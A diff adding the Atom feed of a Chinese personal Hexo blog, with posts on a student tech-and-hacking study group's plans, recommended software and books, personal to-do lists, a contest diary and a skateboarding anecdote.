@@ -1,0 +1,831 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>吾心即宇宙</title>
+  <subtitle>守道一而执术万</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://hlzds.com/"/>
+  <updated>2018-05-19T08:42:34.242Z</updated>
+  <id>http://hlzds.com/</id>
+  
+  <author>
+    <name>曹木木</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>LettersAndSongsForYou</title>
+    <link href="http://hlzds.com/LettersAndSongsForYou/"/>
+    <id>http://hlzds.com/LettersAndSongsForYou/</id>
+    <published>2018-05-19T22:37:29.000Z</published>
+    <updated>2018-05-19T08:42:34.242Z</updated>
+    
+    <content type="html"><![CDATA[<p>## </p>
+<a id="more"></a>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;## &lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>知行合一</title>
+    <link href="http://hlzds.com/words/"/>
+    <id>http://hlzds.com/words/</id>
+    <published>2017-05-19T05:59:10.000Z</published>
+    <updated>2017-03-24T06:28:15.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="此心光明"><a href="#此心光明" class="headerlink" title="此心光明"></a>此心光明</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">见贤思齐焉，见不贤而内自省也</span><br><span class="line">技近乎道，守道一而执术万</span><br><span class="line">宁可天涯披飞雪，何曾人间看落花</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=584155&auto=1&height=66"></iframe>
+
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;此心光明&quot;&gt;&lt;a href=&quot;#此心光明&quot; class=&quot;headerlink&quot; title=&quot;此心光明&quot;&gt;&lt;/a&gt;此心光明&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;见贤思齐焉，见不贤而内自省也&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;技近乎道，守道一而执术万&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;宁可天涯披飞雪，何曾人间看落花&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="心情" scheme="http://hlzds.com/categories/%E5%BF%83%E6%83%85/"/>
+    
+    
+      <category term="words" scheme="http://hlzds.com/tags/words/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>acm</title>
+    <link href="http://hlzds.com/acm/"/>
+    <id>http://hlzds.com/acm/</id>
+    <published>2017-04-09T11:51:00.000Z</published>
+    <updated>2017-04-09T11:51:00.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>## </p>
+<a id="more"></a>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;## &lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>303</title>
+    <link href="http://hlzds.com/303/"/>
+    <id>http://hlzds.com/303/</id>
+    <published>2017-03-26T05:11:14.000Z</published>
+    <updated>2017-03-26T07:47:29.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://o7dp9016e.bkt.clouddn.com/LOGO.jpg" alt=""></p>
+<h2 id="303黑客小组"><a href="#303黑客小组" class="headerlink" title="303黑客小组"></a>303黑客小组</h2><ol start="0">
+<li>主题：曾经有那么多想做的事，现在一起把它变成现实</li>
+<li>目的：学习分享科技知识</li>
+<li>形式：学习教程，提交总结；周日聚会，黑客马拉松</li>
+</ol>
+<h2 id="项目（待完成）"><a href="#项目（待完成）" class="headerlink" title="项目（待完成）"></a>项目（待完成）</h2><ul>
+<li>读书笔记：各种好文、好书的读后感</li>
+<li>从0开始做机器人：arduino</li>
+<li>从0开始成为黑客：burpsuite+sqlmap</li>
+<li>CTF黑客比赛</li>
+<li>飞机：无人机、大型四轴、旋翼机</li>
+<li>喂猫机器人</li>
+<li>人脸识别</li>
+<li>无人车</li>
+<li>机器人</li>
+<li>人工智能</li>
+<li>树莓派教程</li>
+<li>浇花机器人</li>
+</ul>
+<h2 id="学习路径"><a href="#学习路径" class="headerlink" title="学习路径"></a>学习路径</h2><ul>
+<li>乔琛（用git、记录教程、招人参与运营）<ul>
+<li>在实验楼官网学习linux</li>
+<li>在liaoxuefeng.com学习git</li>
+<li>在w3school学习HTML、CSS、JavaScript</li>
+<li>在掘金和开发者头条学习小项目</li>
+</ul>
+</li>
+<li>吴恺璇（记录教程、尝试、管理物品）<ul>
+<li>参照树莓派实验室做项目</li>
+</ul>
+</li>
+<li>史红光（Linux、python）<ul>
+<li>Python全栈工程师</li>
+<li>后端工程师</li>
+</ul>
+</li>
+<li>任思佳（Linux、python）<ul>
+<li>Linux运维</li>
+<li>软件测试</li>
+</ul>
+</li>
+<li>牛柏杰（前端工程师）<ul>
+<li><a href="https://www.shiyanlou.com/paths/web" target="_blank" rel="noopener">web前端</a></li>
+<li>在掘金和开发者头条学习小项目</li>
+</ul>
+</li>
+</ul>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>1.记录工具 <a href="http://shimo.im" target="_blank" rel="noopener">使用石墨文档记笔记</a></p>
+<ol start="2">
+<li>项目基本流程：<ul>
+<li>确定一个项目</li>
+<li>头脑风暴分析可行性，并使用<a href="http://naotu.baidu.com/" target="_blank" rel="noopener">百度脑图</a>进行记录</li>
+<li>使用石墨文档分工协作</li>
+<li>推广</li>
+</ul>
+</li>
+</ol>
+<a id="more"></a>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://o7dp9016e.bkt.clouddn.com/LOGO.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;303黑客小组&quot;&gt;&lt;a href=&quot;#303黑客小组&quot; class=&quot;headerlink&quot; title=&quot;303黑客小组&quot;&gt;&lt;/a&gt;303黑客小组&lt;/h2&gt;&lt;ol start=&quot;0&quot;&gt;
+&lt;li&gt;主题：曾经有那么多想做的事，现在一起把它变成现实&lt;/li&gt;
+&lt;li&gt;目的：学习分享科技知识&lt;/li&gt;
+&lt;li&gt;形式：学习教程，提交总结；周日聚会，黑客马拉松&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&quot;项目（待完成）&quot;&gt;&lt;a href=&quot;#项目（待完成）&quot; class=&quot;headerlink&quot; title=&quot;项目（待完成）&quot;&gt;&lt;/a&gt;项目（待完成）&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;读书笔记：各种好文、好书的读后感&lt;/li&gt;
+&lt;li&gt;从0开始做机器人：arduino&lt;/li&gt;
+&lt;li&gt;从0开始成为黑客：burpsuite+sqlmap&lt;/li&gt;
+&lt;li&gt;CTF黑客比赛&lt;/li&gt;
+&lt;li&gt;飞机：无人机、大型四轴、旋翼机&lt;/li&gt;
+&lt;li&gt;喂猫机器人&lt;/li&gt;
+&lt;li&gt;人脸识别&lt;/li&gt;
+&lt;li&gt;无人车&lt;/li&gt;
+&lt;li&gt;机器人&lt;/li&gt;
+&lt;li&gt;人工智能&lt;/li&gt;
+&lt;li&gt;树莓派教程&lt;/li&gt;
+&lt;li&gt;浇花机器人&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;学习路径&quot;&gt;&lt;a href=&quot;#学习路径&quot; class=&quot;headerlink&quot; title=&quot;学习路径&quot;&gt;&lt;/a&gt;学习路径&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;乔琛（用git、记录教程、招人参与运营）&lt;ul&gt;
+&lt;li&gt;在实验楼官网学习linux&lt;/li&gt;
+&lt;li&gt;在liaoxuefeng.com学习git&lt;/li&gt;
+&lt;li&gt;在w3school学习HTML、CSS、JavaScript&lt;/li&gt;
+&lt;li&gt;在掘金和开发者头条学习小项目&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;吴恺璇（记录教程、尝试、管理物品）&lt;ul&gt;
+&lt;li&gt;参照树莓派实验室做项目&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;史红光（Linux、python）&lt;ul&gt;
+&lt;li&gt;Python全栈工程师&lt;/li&gt;
+&lt;li&gt;后端工程师&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;任思佳（Linux、python）&lt;ul&gt;
+&lt;li&gt;Linux运维&lt;/li&gt;
+&lt;li&gt;软件测试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;牛柏杰（前端工程师）&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.shiyanlou.com/paths/web&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;web前端&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;在掘金和开发者头条学习小项目&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h2&gt;&lt;p&gt;1.记录工具 &lt;a href=&quot;http://shimo.im&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用石墨文档记笔记&lt;/a&gt;&lt;/p&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;项目基本流程：&lt;ul&gt;
+&lt;li&gt;确定一个项目&lt;/li&gt;
+&lt;li&gt;头脑风暴分析可行性，并使用&lt;a href=&quot;http://naotu.baidu.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;百度脑图&lt;/a&gt;进行记录&lt;/li&gt;
+&lt;li&gt;使用石墨文档分工协作&lt;/li&gt;
+&lt;li&gt;推广&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+    
+    </summary>
+    
+      <category term="学习" scheme="http://hlzds.com/categories/%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+      <category term="303" scheme="http://hlzds.com/tags/303/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>study</title>
+    <link href="http://hlzds.com/study/"/>
+    <id>http://hlzds.com/study/</id>
+    <published>2017-03-24T06:01:41.000Z</published>
+    <updated>2017-03-25T11:09:09.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=28465109&auto=1&height=32"></iframe>
+
+<p>计算机方面的资源和项目<br><a id="more"></a></p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol>
+<li><p>工具</p>
+<ul>
+<li><p>硬件 </p>
+<ul>
+<li>电脑，推荐使用mac（苹果电脑）或者Linux，其他的也可以</li>
+<li>kindle，看书不伤眼，专注看书</li>
+<li>机械键盘，快速爱上打字，推荐HHKB、ikbc c86、cherry、pocker</li>
+<li>arduino，20块钱的开发板，可以快速用C语言或者scratch完成编程机器人</li>
+<li>树莓派，价格低廉的世界第三电脑主机，卡片大小，可装Linux系统</li>
+<li>vps，可以线上部署各种环境（算软件？）<ul>
+<li>电脑软件</li>
+</ul>
+</li>
+<li>Alfred，使用快捷键快速完成一些操作，曾经Mac神软排行榜首位</li>
+<li>iTerm2，替换系统自带的terminal，可以使用快捷键在任何时候调出一个特别炫酷的半透明窗口<img src="http://o7dp9016e.bkt.clouddn.com/iterm2.png" alt=""></li>
+<li>sketch,原型设计必备，据说只会这一个软件就可以做UI设计师了</li>
+<li>sublime text 3，也是一个神软，几乎可以编辑一切文件，优点无数</li>
+<li>MindNode，思维导图软件，每日必备</li>
+<li>网易云音乐，三年没换的音乐播放器，听歌看评论</li>
+<li>slack，团队协作沟通工具，英文，need VPN</li>
+<li>telegram，最好的通信工具之一，need VPN</li>
+<li>奇妙清单，好看又好用的清单软件</li>
+<li>MWeb，功能丰富的markdown写作工具</li>
+<li>parallel Desktop，Mac上好用的虚拟机软件</li>
+<li>Dash，快速查阅各种编程语言API<ul>
+<li>手机软件</li>
+</ul>
+</li>
+<li>微信，工作生活必备</li>
+<li>keep，健身软件，教程详细规范</li>
+<li>Trello，团队协作软件，配合网页版使用，need VPN</li>
+<li>印象笔记，个人笔记仓库</li>
+<li>Instagram，可以看到世界上各个国家的照片，need VPN</li>
+<li>pocket，稍后阅读</li>
+<li>Facebook，世界上最大的社交网络平台，need VPN</li>
+<li>tumblr，国外轻博客，need VPN</li>
+<li>quora，外国知乎，need VPN</li>
+<li>知乎，各种问答，提升经验</li>
+<li>简书，很多优秀的写作者</li>
+<li>微博国际版，没有广告，体验优秀</li>
+<li>Dropbox，网盘，need VPN</li>
+<li>Twitter，外国微博，美国总统天天发推特</li>
+<li>google photo，无限量备份照片（非高清）need VPN</li>
+<li>google+，残留的一些技术宅社区，need VPN</li>
+<li>PayPal，外国支付宝</li>
+<li>bilibili，看视频无广告<ul>
+<li>常用网站</li>
+</ul>
+</li>
+<li>Google，毫无疑问，need VPN，第0推荐</li>
+<li><a href="github.com/hlzds">github</a>，学习各种开源项目，第1推荐</li>
+<li><a href="study.163.com">网易云课堂</a>，中国最好的计算机网上课程</li>
+<li>coursera，可以听到斯坦福、MIT等世界著名大学的公开课，其中机器学习课程印象尤深</li>
+<li>Dribble，各种高清图，设计师必备，类似于中国的花瓣网</li>
+<li>readfree.me,很多优秀的电子书</li>
+<li>Stack Overflow，IT知识问答网站，几乎可以解决所有疑难杂症，need VPN</li>
+<li>各种技术社区：CSDN、掘金、开发者头条、推酷，segmentFault、简书</li>
+<li><a href="shiyanlou.com">实验楼</a>,在线Linux环境，学习路径很好，入门必备，第3推荐</li>
+<li>待补充<ul>
+<li>图书</li>
+</ul>
+</li>
+<li>图解密码学，日本人写的书，质量特别高，推荐图解系列</li>
+<li>从0到1，创业家的故事</li>
+<li>黑客与画家，鸡汤</li>
+<li>系统化思维导论，神书，训练思维，打破瓶颈</li>
+<li>天才在左疯子在右，反映精神病人的生活，细思极恐</li>
+<li>西方哲学史，了解哲学史是一件最重要的事情</li>
+<li>圣经，世界销量第一是有道理的</li>
+<li>未来简史，新书，神书，预测了人类的未来</li>
+<li>算法导论，售价128，讲的不难，但是很厚，谁能看完，天下顶尖（还有一套书，什么什么DAO，看完了你就天下无敌了）</li>
+<li>挑战程序设计竞赛，参加ACM必备</li>
+<li>杀死一只知更鸟，学会如何与人相处</li>
+<li>白帽子讲web安全，web安全入门</li>
+<li>待补充</li>
+</ul>
+<hr>
+</li>
+</ul>
+</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;298&quot; height=&quot;52&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=28465109&amp;auto=1&amp;height=32&quot;&gt;&lt;/iframe&gt;
+
+&lt;p&gt;计算机方面的资源和项目&lt;br&gt;
+    
+    </summary>
+    
+      <category term="教程" scheme="http://hlzds.com/categories/%E6%95%99%E7%A8%8B/"/>
+    
+    
+      <category term="教程" scheme="http://hlzds.com/tags/%E6%95%99%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>201606计划</title>
+    <link href="http://hlzds.com/fly/"/>
+    <id>http://hlzds.com/fly/</id>
+    <published>2016-06-12T05:48:28.000Z</published>
+    <updated>2017-03-24T06:51:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p><del>六月份做出一架飞机</del></p>
+<a id="more"></a>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=27901180&auto=1&height=66"></iframe>
+
+
+<h2 id="2016-06-12"><a href="#2016-06-12" class="headerlink" title="2016-06-12"></a>2016-06-12</h2><ul>
+<li><del>带上书包、MBA、螺旋桨、电池</del></li>
+<li><del>去康利达集团拿回机械手臂</del></li>
+<li><del>去青创汇拿iPad Pro和孵化园钥匙</del></li>
+</ul>
+<h2 id="2016-06-13"><a href="#2016-06-13" class="headerlink" title="2016-06-13"></a>2016-06-13</h2><ul>
+<li><del>回来打扫卫生</del></li>
+<li><del>规划：查看地点，资料整理，未来规划</del></li>
+<li><del>卡片电脑计划并开始实施</del></li>
+</ul>
+<h2 id="2016-06-14"><a href="#2016-06-14" class="headerlink" title="2016-06-14"></a>2016-06-14</h2><ul>
+<li><del>去五金店买零件</del></li>
+<li><del>确定在地下室加工</del></li>
+</ul>
+<h2 id="2016-06-15"><a href="#2016-06-15" class="headerlink" title="2016-06-15"></a>2016-06-15</h2><p> <del>去调查是否有足够多的材料</del> </p>
+<ul>
+<li></li>
+<li><del>确定场地：孵化园和空地</del></li>
+</ul>
+<hr>
+<h2 id="2016-06-16"><a href="#2016-06-16" class="headerlink" title="2016-06-16"></a>2016-06-16</h2><p>1.~~ 购买一套树莓派留作备用~~</p>
+<ol start="2">
+<li><del>找中兴图文的老板商量包装和设计</del></li>
+<li><del>和艺术系女生交流，分配任务</del></li>
+<li><del><em>确定卡片电脑口号：（make a computer in one minute,to develop interesting games and do everything you want~）制作出一台电脑，用来开发有趣的游戏和做任何想做的事</em></del></li>
+<li><del>列出详细的材料表格并打印出来</del></li>
+<li><del>安排做树莓派的任务</del></li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h2&gt;&lt;p&gt;&lt;del&gt;六月份做出一架飞机&lt;/del&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="计划" scheme="http://hlzds.com/categories/%E8%AE%A1%E5%88%92/"/>
+    
+    
+      <category term="2016" scheme="http://hlzds.com/tags/2016/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>互联网+创新创业比赛</title>
+    <link href="http://hlzds.com/internet+race/"/>
+    <id>http://hlzds.com/internet+race/</id>
+    <published>2016-06-07T15:07:32.000Z</published>
+    <updated>2017-03-24T03:14:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="雷雨"><a href="#雷雨" class="headerlink" title="雷雨"></a>雷雨</h2><p><em>原定今天下午2点开始的比赛，一点九分在微信群里接到通知要求所有团队着正装到行政楼排练，一点半前必须到——然而大家看到这条消息的时候已经一点半了，而且在路上突然开始电闪雷鸣，到了之后杜处长很生气，先让我上台演练，我心想，这么大年纪的人，为何还会生气呢？于是反而盯着他的眼睛说，好，我第一个上。</em></p>
+<h2 id="自卑"><a href="#自卑" class="headerlink" title="自卑"></a>自卑</h2><p><em>陈欣他们给我空出一个位子。他们说，学长，我们觉得我们不行。我说，在场的人都不行，你能不能比他们强一点？</em></p>
+<a id="more"></a>
+<h2 id="遗失"><a href="#遗失" class="headerlink" title="遗失"></a>遗失</h2><p><em>窗外风雨大作，谷佳璐刚来到我身边便问，模型带来了吗？我答，没，还在我书包里。佳璐说，还是带来比较好。此时14：28，还有两分钟上课，我给天行打电话，他不在宿舍，却冒着风雨回到宿舍再来到行政楼给我送过来。</em></p>
+<h2 id="归来"><a href="#归来" class="headerlink" title="归来"></a>归来</h2><p><em>风雨故人来。鹏鹏回来了。</em></p>
+<h2 id="冒险"><a href="#冒险" class="headerlink" title="冒险"></a>冒险</h2><p><em>我问小王和巧，我准备换一种演讲风格，并且用两分钟讲完PPT，愿意陪我冒一次险吗？他们犹豫了几秒钟，说，好。</em></p>
+<h2 id="裤子"><a href="#裤子" class="headerlink" title="裤子"></a>裤子</h2><p><em>快要上场的时候，后排一个学弟拍我肩膀说，学长，我们是第十组，到时候你演讲完了能不能把你的裤子借我穿一下？我说，好啊。</em></p>
+<h2 id="上场"><a href="#上场" class="headerlink" title="上场"></a>上场</h2><p><em>首先表达了一下对做农场的学长的敬佩，可惜无人共鸣。谈笑间瞬息万变，最想不到的问题评委老师还是问了：有人早就做过和你们差不多的产品。我问道，老师您是UFO众创空间的负责人吗？老师说是。我又问道，您认识XX和XX吗？老师说，我们在做同样的事。我抛了个媚眼：老师我们是自己人啊！全场暗笑，好久才回到正题，时间刚好结束。</em></p>
+<h2 id="桃花"><a href="#桃花" class="headerlink" title="桃花"></a>桃花</h2><p><em>主持人一男一女，女孩叫杨柳青青，坐在我前面自拍，照住我半个脑袋，我比了个剪刀手，她在那里笑。男孩忽然转过头来说，你们团队的那个女孩太优秀了！第一次见到这么优秀的女孩！我想了想，刚才上台发言的都是我啊，他说女孩优秀，肯定说是外貌了，巧的确是个大美女，可不能和你这个大流氓扯上关系。于是便欲擒故纵：想不想知道手机号呀？他立马摇头：不想，我有女朋友。我惊呆了。</em></p>
+<h2 id="邀拍"><a href="#邀拍" class="headerlink" title="邀拍"></a>邀拍</h2><p><em>虽说学长是创业有成之人，回来参加比赛发挥的并不好，学校为了照顾其面子，还是把特等奖给了他，但我一直耿耿于怀他答应我的事情，每一次都没能做到。</em></p>
+<h2 id="陈欣"><a href="#陈欣" class="headerlink" title="陈欣"></a>陈欣</h2><p><em>他们是第一名。晚上回来问我，学长，我现在还不明白我们为什么是第一名。我回道，天时地利人和。这个项目从零到有，源于我和他们的一次头脑风暴，他们不仅听了我的建议，还落实了。可我还是隐隐担忧：PPT展示的那些东西，他们没有一样做出来，怎么见投资人？</em></p>
+<h2 id="晚餐"><a href="#晚餐" class="headerlink" title="晚餐"></a>晚餐</h2><p><em>凑齐七个人，可以召唤神龙了~虽然小王还在召唤师峡谷骂那个送人头的人，我们已经开始点菜了（下次不要点碳锅鸡，看起来那么大就吃不下）。思齐总让我想到鬼吹灯里的思甜，晓东原来也是个逗比。边吃边聊，从比赛聊到梦想，再聊到鬼神，直到关门才走。</em></p>
+<h2 id="仲夏夜"><a href="#仲夏夜" class="headerlink" title="仲夏夜"></a>仲夏夜</h2><p><em>阵雨刚过，空气清新，一群人一路闹着回宿舍，鹏鹏把我抱起来转了一圈，佳璐也要抱我，没抱起来（回去称了一下体重，我瘦了很多，才66.66kg👀）啊，我要再长高一点就可以改变宇宙了，现在这么矮，只能改变地球了</em></p>
+<h2 id="wanan"><a href="#wanan" class="headerlink" title="wanan"></a>wanan</h2><p><em>这种感觉真好啊，一点也不孤独。</em></p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=30987882&auto=1&height=66"></iframe>
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;雷雨&quot;&gt;&lt;a href=&quot;#雷雨&quot; class=&quot;headerlink&quot; title=&quot;雷雨&quot;&gt;&lt;/a&gt;雷雨&lt;/h2&gt;&lt;p&gt;&lt;em&gt;原定今天下午2点开始的比赛，一点九分在微信群里接到通知要求所有团队着正装到行政楼排练，一点半前必须到——然而大家看到这条消息的时候已经一点半了，而且在路上突然开始电闪雷鸣，到了之后杜处长很生气，先让我上台演练，我心想，这么大年纪的人，为何还会生气呢？于是反而盯着他的眼睛说，好，我第一个上。&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&quot;自卑&quot;&gt;&lt;a href=&quot;#自卑&quot; class=&quot;headerlink&quot; title=&quot;自卑&quot;&gt;&lt;/a&gt;自卑&lt;/h2&gt;&lt;p&gt;&lt;em&gt;陈欣他们给我空出一个位子。他们说，学长，我们觉得我们不行。我说，在场的人都不行，你能不能比他们强一点？&lt;/em&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="心情" scheme="http://hlzds.com/categories/%E5%BF%83%E6%83%85/"/>
+    
+    
+      <category term="比赛" scheme="http://hlzds.com/tags/%E6%AF%94%E8%B5%9B/"/>
+    
+      <category term="鼻美净" scheme="http://hlzds.com/tags/%E9%BC%BB%E7%BE%8E%E5%87%80/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>仲夏夜的小萝莉</title>
+    <link href="http://hlzds.com/wonderful-night/"/>
+    <id>http://hlzds.com/wonderful-night/</id>
+    <published>2016-05-19T15:09:09.000Z</published>
+    <updated>2017-03-24T05:55:25.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="萌萌的小萝莉"><a href="#萌萌的小萝莉" class="headerlink" title="萌萌的小萝莉"></a>萌萌的小萝莉</h2><p>九点多才去体育场玩长板，又遇到之前那个三岁小女孩在玩轮滑。一见到我就说：哥哥，你可算来啦！简直萌化了~<em> ~ </em>然后趁着妈妈不注意，偷偷在我耳边说，哥哥，我要送你一样东西！然后很严肃地从一个小口袋里拿出一颗紫色的大钻石和一颗小一点的透明钻石，然后把那个大钻石给了我。</p>
+<p>过了一会儿妈妈叫她回家，小萝莉依依不舍地说，哥哥，去我家好不好？我说，不行，现在是夜晚，哥哥要回去休息。小萝莉说，那去我家休息吧，我把我的床让给你，还有我的小熊[可怜状]。这时妈妈就来抱她走，她对妈妈说，让我给哥哥说再见好不好，然后向我跑来，把最后的透明钻石偷偷塞给了我，还大声说：哥哥明天见！</p>
+<p>莫名地好感动\w\</p>
+<a id="more"></a>
+<h2 id="三个女孩"><a href="#三个女孩" class="headerlink" title="三个女孩"></a>三个女孩</h2><p>正在学一个高难度动作，然后体育场又来了一个玩滑板的女孩，是小鱼板。在这个玩滑板这么少的地方，看到了另一个滑板，简直高兴的不能用言语形容，一问才知道昨天才学，但是已经很稳了。</p>
+<p>然后又来了一个女孩，灯光很暗，看不清，但是头发很长，有点大大咧咧的，很像我妹妹，也想试试滑板，但是小鱼板有点难以控制，我又不太好意思扶她，差点害她摔了😂</p>
+<p>过了一会儿来了第三个女孩，和前两个都认识，在我试小鱼板的花式交出我的处女摔之后，她已经稳稳地在我的长板上前进了，一问，居然是第一次！天呐，这才几分钟！然后她告诉我，这正是前几日的梦境！我的脑袋就嗡了一下：又出来一个这样的人？后来发现并不是，只是偶尔。</p>
+<h2 id="last-but-not-least"><a href="#last-but-not-least" class="headerlink" title="last but not least"></a>last but not least</h2><p><em>提交swift代码到github终于成功了</em></p>
+<hr>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=5077382&auto=1&height=66"></iframe>
+
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;萌萌的小萝莉&quot;&gt;&lt;a href=&quot;#萌萌的小萝莉&quot; class=&quot;headerlink&quot; title=&quot;萌萌的小萝莉&quot;&gt;&lt;/a&gt;萌萌的小萝莉&lt;/h2&gt;&lt;p&gt;九点多才去体育场玩长板，又遇到之前那个三岁小女孩在玩轮滑。一见到我就说：哥哥，你可算来啦！简直萌化了~&lt;em&gt; ~ &lt;/em&gt;然后趁着妈妈不注意，偷偷在我耳边说，哥哥，我要送你一样东西！然后很严肃地从一个小口袋里拿出一颗紫色的大钻石和一颗小一点的透明钻石，然后把那个大钻石给了我。&lt;/p&gt;
+&lt;p&gt;过了一会儿妈妈叫她回家，小萝莉依依不舍地说，哥哥，去我家好不好？我说，不行，现在是夜晚，哥哥要回去休息。小萝莉说，那去我家休息吧，我把我的床让给你，还有我的小熊[可怜状]。这时妈妈就来抱她走，她对妈妈说，让我给哥哥说再见好不好，然后向我跑来，把最后的透明钻石偷偷塞给了我，还大声说：哥哥明天见！&lt;/p&gt;
+&lt;p&gt;莫名地好感动\w\&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="心情" scheme="http://hlzds.com/categories/%E5%BF%83%E6%83%85/"/>
+    
+    
+      <category term="萝莉" scheme="http://hlzds.com/tags/%E8%90%9D%E8%8E%89/"/>
+    
+      <category term="钻石" scheme="http://hlzds.com/tags/%E9%92%BB%E7%9F%B3/"/>
+    
+      <category term="长板" scheme="http://hlzds.com/tags/%E9%95%BF%E6%9D%BF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>plans</title>
+    <link href="http://hlzds.com/plans/"/>
+    <id>http://hlzds.com/plans/</id>
+    <published>2016-05-19T05:13:07.000Z</published>
+    <updated>2017-03-24T03:14:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="2016-05-19"><a href="#2016-05-19" class="headerlink" title="2016-05-19"></a>2016-05-19</h2><ul>
+<li><del>iOS小项目代码上传到GitHub</del></li>
+<li><del>拿回手机</del></li>
+<li><del>完善HEXO博客</del></li>
+<li><del>查阅知网K-匿名论文</del></li>
+</ul>
+<a id="more"></a>
+<h2 id="2016-5-20"><a href="#2016-5-20" class="headerlink" title="2016-5-20"></a>2016-5-20</h2><ul>
+<li><del>给荷花加水</del></li>
+</ul>
+<h2 id="2016-05-24"><a href="#2016-05-24" class="headerlink" title="2016-05-24"></a>2016-05-24</h2><ul>
+<li><del>开封合作方案</del></li>
+<li><del>飞行器计划书</del></li>
+<li><del>网站运营团队</del></li>
+</ul>
+<h2 id="2016-05-28"><a href="#2016-05-28" class="headerlink" title="2016-05-28"></a>2016-05-28</h2><ul>
+<li><p><del>ACM/ICPC计划</del></p>
+</li>
+<li><p><del>健身计划</del></p>
+</li>
+<li><p><del>阅读计划</del></p>
+</li>
+</ul>
